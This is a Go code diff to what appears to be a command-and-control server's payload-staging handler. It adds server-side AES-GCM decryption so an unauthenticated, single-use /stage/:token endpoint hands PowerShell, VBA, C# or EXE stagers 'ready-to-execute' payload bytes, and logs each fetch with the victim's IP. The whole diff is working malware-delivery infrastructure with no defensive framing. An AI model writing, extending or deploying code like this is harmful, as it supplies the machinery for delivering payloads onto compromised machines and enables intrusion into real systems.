@@ -193,10 +193,30 @@ func (h *Handlers) DeleteStage(c *gin.Context) {
 
 // ── stager-facing endpoint (no auth — token IS the credential) ───────────────
 
-// ServeStage delivers the encrypted payload to the stager.
-// GET /stage/:token
-// The stager decrypts the payload using its baked-in key.
-// By default the stage is single-use (burned after first fetch).
+// stageDecrypt decrypts an AES-256-GCM ciphertext produced by stageEncrypt.
+// Format: nonce(12) | ciphertext
+func stageDecrypt(encKey string, data []byte) ([]byte, error) {
+	k := sha256.Sum256([]byte(encKey))
+	block, err := aes.NewCipher(k[:])
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	ns := gcm.NonceSize()
+	if len(data) < ns {
+		return nil, fmt.Errorf("ciphertext too short")
+	}
+	return gcm.Open(nil, data[:ns], data[ns:], nil)
+}
+
+// ServeStage decrypts and delivers the payload to the stager.
+// GET /stage/:token  (public — token IS the access credential)
+// The server decrypts the payload before serving so that all stager
+// formats (PS1, VBA, CS, compiled EXE) receive ready-to-execute bytes.
+// Stage is single-use: burned after first successful fetch.
 func (h *Handlers) ServeStage(c *gin.Context) {
 	token := c.Param("token")
 	if token == "" {
@@ -217,11 +237,20 @@ func (h *Handlers) ServeStage(c *gin.Context) {
 		return
 	}
 
+	// Decrypt the payload before serving
+	plaintext, err := stageDecrypt(h.server.Config.EncryptionKey, row.Payload)
+	if err != nil {
+		h.server.Logger.Warn("STAGE", fmt.Sprintf("Decrypt failed token=%s ip=%s: %v",
+			token, c.ClientIP(), err), "", "", nil)
+		c.Status(http.StatusInternalServerError)
+		return
+	}
+
 	// Mark used (one-shot by default)
 	_ = h.server.Store.MarkStageUsed(token, c.ClientIP())
 
-	h.server.Logger.Info("STAGE", fmt.Sprintf("Stage served token=%s ip=%s format=%s",
-		token, c.ClientIP(), row.Format), "", "", nil)
+	h.server.Logger.Info("STAGE", fmt.Sprintf("Stage served token=%s ip=%s format=%s size=%d",
+		token, c.ClientIP(), row.Format, len(plaintext)), "", "", nil)
 
-	c.Data(http.StatusOK, "application/octet-stream", row.Payload)
+	c.Data(http.StatusOK, "application/octet-stream", plaintext)
 }
